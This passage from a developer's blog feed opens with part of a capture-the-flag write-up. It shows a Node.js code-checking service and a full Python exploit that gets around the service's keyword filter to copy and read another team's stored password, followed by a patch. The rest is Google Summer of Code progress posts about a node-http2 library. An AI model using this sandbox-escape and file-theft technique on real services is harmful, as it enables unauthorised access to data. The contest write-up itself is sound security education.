</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">    <span class="p">});</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Caught exception: &#39;</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
</span><span class="line"><span class="p">});</span>
</span><span class="line">
</span><span class="line"><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The full functionality:</p>

<ul>
  <li>If <code>flag_id</code>, <code>token</code> and <code>code</code> is specified as JSON
    <ul>
      <li>the code is run if it passes the filter (<code>eval</code>, <code>global</code>, <code>Function</code> and <code>this</code> is not alowed)</li>
      <li>the code can’t use <code>require</code> because <a href="https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU">it’s not exposed by default</a> when using the <code>vm</code> module</li>
      <li>if it sets the variable <code>password</code> then the code is stored in this file: <code>submissions/{flag_id}-{token}</code></li>
    </ul>
  </li>
  <li>If only <code>flag_id</code> and <code>token</code> is specified
    <ul>
      <li>the password from the <code>submissions/{flag_id}-{token}</code> file is read and returned</li>
      <li>but only if the password is 16 alphanumerical character</li>
    </ul>
  </li>
</ul>

<h2 id="exploitation">Exploitation</h2>

<p>Our exploit worked like this:</p>

<ol>
  <li>Upload a code,</li>
  <li>that finds the file associated with the flag_id</li>
  <li>and copies the file to a known location.</li>
  <li>Use the password retrieval functionality to retrieve the password from the known location.</li>
</ol>

<p>Here’s the full exploit code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">json</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">re</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">Exploit</span><span class="p">():</span>
</span><span class="line">    <span class="n">code</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class="line"><span class="s">    fname = ff.readdirSync(&#39;./submissions&#39;).filter(function(name) { return name.match(/^</span><span class="si">%s</span><span class="s">-.*/) })[0];</span>
</span><span class="line"><span class="s">    ff.writeFileSync(&#39;./submissions/spamandhex-1&#39;, ff.readFileSync(&#39;./submissions/&#39; + fname));</span>
</span><span class="line"><span class="s">    &quot;&quot;&quot;</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
</span><span class="line">        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span> <span class="p">})</span>
</span><span class="line">        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">set</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
</span><span class="line">        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">&quot;code&quot;</span><span class="p">:</span> <span class="n">code</span> <span class="p">})</span>
</span><span class="line">        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">):</span>
</span><span class="line">        <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class="line">        <span class="bp">self</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;1234&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">,</span> <span class="n">Exploit</span><span class="o">.</span><span class="n">code</span> <span class="o">%</span> <span class="n">flag_id</span><span class="p">)</span>
</span><span class="line">        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;spamandhex&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class="line">        <span class="bp">self</span><span class="o">.</span><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Your password: (.*)&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line">
</span><span class="line">    <span class="k">def</span> <span class="nf">result</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class="line">        <span class="k">return</span> <span class="p">{</span><span class="s">&#39;FLAG&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">flag</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Instead of using <code>require</code> to access the <code>fs</code> module, the global <code>ff</code> variable (set by the server code) was used that holds a reference to the <code>fs</code> module. The filter does not find the <code>function</code> keyword because the filter was <code>/Function/</code> and regexes are case-sensitive by default.</p>

<p>After launching our own, we also saw an exploit that abuses the fact that exceptions were reported back to the submitter. This exploit did read out the password from the appropriate file and generated an exception with the password as text.</p>

<h2 id="patch">Patch</h2>

<p>As a patch, I renamed the <code>ff</code> variable to <code>fs</code>, and it turned out to be enough to keep the other teams away.</p>

<h2 id="thanks">Thanks</h2>

<p>It was great fun to solve this puzzle, just as fun as the whole UCSB iCTF competition this year. Thanks to the organizers for organizing such a great competition again this year!</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC - wrap up]]></title>
    <link href="http://gabor.molnar.es/blog/2013/09/25/gsoc-wrap-up/"/>
    <updated>2013-09-25T20:39:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/09/25/gsoc-wrap-up</id>
    <content type="html"><![CDATA[<p>This year’s Google Summer of Code program has sadly come to an end. It has been a great summer for me: I’ve met fantastic people, worked on software that will hopefully be widely used in the future, and contributed to the evolving HTTP/2 standard. </p>

<!-- more -->

<p>My Summer of Code project in numbers:</p>

<ul>
  <li>2 node.js modules:
    <ul>
      <li><a href="https://github.com/molnarg/node-http2">node-http2</a> : an HTTP/2 client and server implementation for node.js</li>
      <li><a href="https://github.com/molnarg/http2-testpage">http2-testpage</a> : a test server for testing client side HTTP/2 implementations</li>
    </ul>
  </li>
  <li>3147 lines of code (the main HTTP/2 implementation code)</li>
  <li>2647 lines of test (in 94 node-http2 unit tests, and 32 http2-testpage testcases, providing ~90% <a href="https://github.com/molnarg/node-http2#test-coverage">code coverage</a>)</li>
  <li>1426 lines of code comment (base of the generated <a href="http://molnarg.github.io/node-http2/doc/">developer documentation</a> and <a href="https://github.com/molnarg/node-http2/wiki/Public-API">API reference</a>)</li>
  <li>502 <a href="https://github.com/molnarg/node-http2/commits/master">commits</a></li>
  <li>16 <a href="http://gabor.molnar.es/blog/categories/google-summer-of-code/">blog posts</a></li>
  <li>15 <a href="https://github.com/molnarg/node-http2/releases">releases</a></li>
  <li>launched the second public HTTP/2 server ever (after Microsoft’s <a href="https://github.com/MSOpenTech/http2-katana">http2-katana</a> test server)</li>
  <li>with the help of one great mentor :)</li>
</ul>

<p>My http2 node.js module is ready to use, and I don’t plan to break the API in the foreseeable future, so I tagged last week’s release as 1.0.0. As most 1.0.0 software releases, this is the end of a long process, but certainly not the end of the work. There are still lot of things to do:</p>

<ul>
  <li>continuously upgrading to the latest draft of the standard (current draft: <a href="http://tools.ietf.org/html/draft-ietf-httpbis-http2-06">draft-ietf-httpbis-http2-06</a>)</li>
  <li>fixing the issues that come up when more and more people start using this module</li>
  <li>implementing the few <a href="https://github.com/molnarg/node-http2/issues?labels=feature">missing features</a> (the most important one is the <a href="https://github.com/molnarg/node-http2/issues/5">TLS ALPN support</a>)</li>
  <li><a href="https://github.com/molnarg/node-http2/issues?labels=performance">performance optimization</a></li>
</ul>

<p>I will keep maintaining this module in my free time, so expect regular updates in the future too :)</p>

<p>I would like to say thank you to all the amazing people who made all of this possible, especially Nick Hurley of Mozilla, my mentor, who spent countless hours with reviewing my code, listening to my problems and giving advice.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #13]]></title>
    <link href="http://gabor.molnar.es/blog/2013/09/15/gsoc-week-number-13/"/>
    <updated>2013-09-15T22:00:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/09/15/gsoc-week-number-13</id>
    <content type="html"><![CDATA[<p>This is the summary of the 13. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>This week was about making node-http2 fast, and starting work on a new project: <a href="https://github.com/molnarg/http2-testpage">http2-testpage</a>.</p>

<p>It all began with a <a href="https://github.com/molnarg/node-http2/issues/47">GitHub issue</a> opened by <a href="https://twitter.com/tatsuhiro_t">Tatsuhiro Tsujikawa</a> (creator of <a href="https://github.com/tatsuhiro-t/spdylay">spdylay</a> and <a href="https://github.com/tatsuhiro-t/nghttp2">nghttp2</a>). It took lot of time to fix it, but then I was so deep into this performance optimization thing that I continued with other improvements. The optimizations were all based on CPU profiling data collected using <a href="https://github.com/c4milo/node-webkit-agent">node-webkit-agent</a>.</p>

<p>The result is that it now takes 2 seconds to serve 600 small parallel request from the same client, while it took so long before that I could not even wait for it to complete. It’s great improvement, but I still plan to further optimize this, since there’s still room for improvements. I also plan to post about the lessons learned during the process sometime next week.</p>

<p>Other than that, I started <a href="https://github.com/molnarg/http2-testpage">http2-testpage</a>. It’s a tool that injects intentional failures into HTTP/2 connections to test clients’ reaction. The next week will be dedicated to working on this.</p>

<p>As usual, the latest code is published on npm (<code>npm install http2</code> and <code>npm install http2-testpage</code>). The <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> and the <a href="https://gabor.molnar.es:8080">prototype public server</a> was updated as well.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #12]]></title>
    <link href="http://gabor.molnar.es/blog/2013/09/09/gsoc-week-number-12/"/>
    <updated>2013-09-09T22:58:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/09/09/gsoc-week-number-12</id>
    <content type="html"><![CDATA[<p>This is the summary of the 12. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The main item that I got done this week was the upgrade to the latest draft of the spec: <a href="http://tools.ietf.org/html/draft-ietf-httpbis-http2-06">draft-ietf-httpbis-http2-06</a>. This was a really smooth transition.</p>

<p>I had to rewrite a large part of the <a href="http://molnarg.github.io/node-http2/doc/compressor.html">compression code</a>, but that was expected. I have to say that I like the <a href="http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-03">current version of the compression spec</a> much better than previous versions. The text is much cleaner and it finally allows the building of a streaming header encoder and decoder implementation. The new implementation is therefore consists of a pair of transform streams that do the compression/decompression. The decompressor is in fact just buffering the input and then processing it in one large batch at the end, but fixing that is already on my todo list (<a href="https://github.com/molnarg/node-http2/issues/46">issue #46</a>). The next step would be exposing these streaming interfaces on the public API.</p>

<p>For the next week, I’d like to finally start implementing a HTTP/2 test page for browsers (using the to-be-done <a href="https://github.com/molnarg/node-http2/issues/33">failure injection capability</a>). It has been on the table for a long time now, but I think that the time has come to finally start working on this.</p>

<p>As usual, the latest code is published on npm, and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a>. The <a href="https://gabor.molnar.es:8080">prototype public server</a> is down at the moment, but will be up, and updated soon!</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #11]]></title>
    <link href="http://gabor.molnar.es/blog/2013/09/03/gsoc-week-number-11/"/>
    <updated>2013-09-03T22:46:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/09/03/gsoc-week-number-11</id>
    <content type="html"><![CDATA[<p>This is the summary of the 11. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The focus of this week was testing: I wrote lots of unit tests to achieve 80% for every test coverage metric on every submodule.</p>

<p><img src="http://gabor.molnar.es/images/test-coverage.png" /></p>

<p>This led to lot of bugfixes. For example, I was able to fix the issue with push requests I saw last week when testing with Firefox. Additionally, I discovered that node’s NPN implementation does not always work well, and opened a <a href="https://github.com/joyent/node/issues/6168">ticket</a> for this issue.</p>

<p>Main work items for the next week are:</p>

<ul>
  <li><a href="https://github.com/molnarg/node-http2/issues/39">update to the -06 version of the draft</a></li>
  <li>start working on a HTTP/2 test page for browsers (using the to-be-done <a href="https://github.com/molnarg/node-http2/issues/33">failure injection capability</a>)</li>
</ul>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> and the <a href="https://gabor.molnar.es:8080">prototype public server</a> was updated as well.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #10]]></title>
    <link href="http://gabor.molnar.es/blog/2013/08/27/gsoc-week-number-10/"/>
    <updated>2013-08-27T22:35:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/08/27/gsoc-week-number-10</id>
    <content type="html"><![CDATA[<p>This is the summary of the 10. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The biggest work item I got done this week is <a href="https://github.com/molnarg/node-http2/issues/19">the</a> <a href="https://github.com/molnarg/node-http2/issues/20">prioritization</a>.</p>

<p>Besides that, I worked on <a href="https://github.com/molnarg/node-http2/issues/32">API compatibility</a>. That means that the <a href="https://github.com/molnarg/node-http2/wiki/Public-API">node-http2 API</a> now looks very similar to the standard node.js HTTP API.</p>

<p>Goals for the next week is <a href="https://github.com/molnarg/node-http2/issues/43">improving test coverage</a>, and starting work on a HTTP/2 test service with <a href="https://github.com/molnarg/node-http2/issues/33">failure injection</a> capability. Failure injection makes it possible to test how HTTP/2 implementations react to malfunctioning peers. Testing browsers with a failure injection tool is one of the main goals of this project, so it’s quite important to get right. Possible error scenarios are collected <a href="https://github.com/molnarg/node-http2/wiki/Error-Scenarios">in the wiki</a>.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> and the <a href="https://gabor.molnar.es:8080">prototype public server</a> was updated as well.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #9]]></title>
    <link href="http://gabor.molnar.es/blog/2013/08/19/gsoc-week-number-9/"/>
    <updated>2013-08-19T21:46:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/08/19/gsoc-week-number-9</id>
    <content type="html"><![CDATA[<p>This is the summary of the 9. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The focus of this week was improving the top layer of the stack: the public API and the mapping of HTTP concepts to HTTP/2 streams.</p>

<p>Besides that, with the help of Patrick McManus from the Mozilla networking team, I managed to get node-http2 to work with the <a href="https://wiki.mozilla.org/Networking/http2">latest HTTP/2 development build of Firefox</a>! In the process we also discovered a bug in Firefox’s header compression implementation. If you follow this blog you’ve probably seen the proof, but here it is again :)</p>

<p><img src="http://gabor.molnar.es/images/node-http2-loves-firefox.png" /></p>

<p>Improving the top layer meant</p>

<ul>
  <li><a href="https://github.com/molnarg/node-http2/issues/26">implementation of connection pooling</a></li>
  <li><a href="https://github.com/molnarg/node-http2/issues/31">exposing server push</a></li>
  <li><a href="https://github.com/molnarg/node-http2/issues/27">adding logging</a></li>
  <li><a href="https://github.com/molnarg/node-http2/issues/32">lot of work on API compatibility with the standard HTTPS module</a> (full API compatibility is not achieved yet, but should not be long time before it will be)</li>
</ul>

<p>What I did not have time for is <a href="https://github.com/molnarg/node-http2/issues/20">implementing</a> <a href="https://github.com/molnarg/node-http2/issues/19">prioritization</a>, which is the main goal for the following days. If I have more time this week, the next thing on my TODO list is an <a href="https://github.com/molnarg/node-http2/issues/33">API for intentional failure injection</a>. This would make it possible to write a server that tests its clients’ error handling capabilities.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> and the <a href="https://gabor.molnar.es:8080">prototype public server</a> was updated as well.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[node-http2 ♥ Firefox]]></title>
    <link href="http://gabor.molnar.es/blog/2013/08/15/node-http2-loves-firefox/"/>
    <updated>2013-08-15T15:41:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/08/15/node-http2-loves-firefox</id>
    <content type="html"><![CDATA[<p><img src="http://gabor.molnar.es/images/node-http2-loves-firefox.png" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #8]]></title>
    <link href="http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8/"/>
    <updated>2013-08-12T22:36:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8</id>
    <content type="html"><![CDATA[<p>This is the summary of the 8. week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The two main topics of this week was: testing and flow control.</p>

<p>I participated remotely on the interoperability testing that was organized on the second day of the <a href="https://github.com/http2/wg_materials/blob/master/interim-13-08/agenda.md">HTTPBis Interim Meeting in Hamburg</a>. Working with <a href="https://twitter.com/tatsuhiro_t">Tatsuhiro Tsujikawa</a> (<a href="https://github.com/tatsuhiro-t/nghttp2">nghttp2</a>), <a href="https://twitter.com/jovi0608">Shigeki Ohtsu</a> and <a href="https://twitter.com/fakalin">Fred Akalin</a> (Chrome) helped to discover a few bugs in both mine and their implementation. The public server set up last week proved to very useful for testing. This screenshot is made by Fred with an experimental build of Chrome:</p>

<p><img src="http://gabor.molnar.es/images/gabor_interop.png" /></p>

<p>There were several corner cases in flow control that were not handled well, and I believe that these are solved now. In the process of solving these, the flow control implementation of the <a href="http://molnarg.github.io/node-http2/doc/connection.html">Connection</a> and the <a href="http://molnarg.github.io/node-http2/doc/stream.html">Stream class</a> were merged into a common parent class: <a href="http://molnarg.github.io/node-http2/doc/flow.html">Flow</a>.</p>

<p>I try to constantly improve the developer documentation, and as part this, I documented the APIs of the Stream, the Connection and the Flow classes. I also added two nice <a href="http://molnarg.github.io/node-http2/doc/stream.html#section-14">ASCII art</a> <a href="http://molnarg.github.io/node-http2/doc/flow.html#section-14">figures</a> to make reading the source code less boring :)</p>

<p>For the next week, I plan to <a href="https://github.com/molnarg/node-http2/issues/26">improve the</a> <a href="https://github.com/molnarg/node-http2/issues/32">public API</a>, <a href="https://github.com/molnarg/node-http2/issues/31">expose server push</a>, and <a href="https://github.com/molnarg/node-http2/issues/20">implement</a> <a href="https://github.com/molnarg/node-http2/issues/19">prioritization</a>.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> and the <a href="https://gabor.molnar.es:8080">prototype public server</a> was updated as well.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #6 and #7]]></title>
    <link href="http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7/"/>
    <updated>2013-08-05T23:01:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7</id>
    <content type="html"><![CDATA[<p>This is the summary of the sixth and seventh week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The summary for the sixth week is short: I’ve had summer holiday :) Next week marked a quite big milestone for the project: having a public API and launching a public test server!</p>

<p>The public API is very similar to the <a href="http://nodejs.org/api/https.html">standard node.js HTTPS API</a>. The goal is to achieve perfect API compatibility, and to add HTTP/2 related stuff as extension to the API. Currently, there’s o public API for server push, but that’s probably coming this week.</p>

<p>A short example of using node-http2 as client:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">http2</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http2&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">http2</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
</span><span class="line">  <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;gabor.molnar.es&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="nx">port</span><span class="o">:</span> <span class="mi">8080</span><span class="p">,</span>
</span><span class="line">  <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="nx">rejectUnauthorized</span><span class="o">:</span> <span class="kc">false</span>
</span><span class="line"><span class="p">});</span>
</span><span class="line"><span class="nx">request</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
</span><span class="line">
</span><span class="line"><span class="nx">request</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;response&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="nx">response</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">);</span>
</span><span class="line"><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Using as server:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">http2</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http2&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
</span><span class="line">  <span class="nx">key</span><span class="o">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;./example/localhost.key&#39;</span><span class="p">),</span>
</span><span class="line">  <span class="nx">cert</span><span class="o">:</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;./example/localhost.crt&#39;</span><span class="p">)</span>
</span><span class="line"><span class="p">};</span>
</span><span class="line">
</span><span class="line"><span class="nx">http2</span><span class="p">.</span><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="nx">response</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Hello world!&#39;</span><span class="p">);</span>
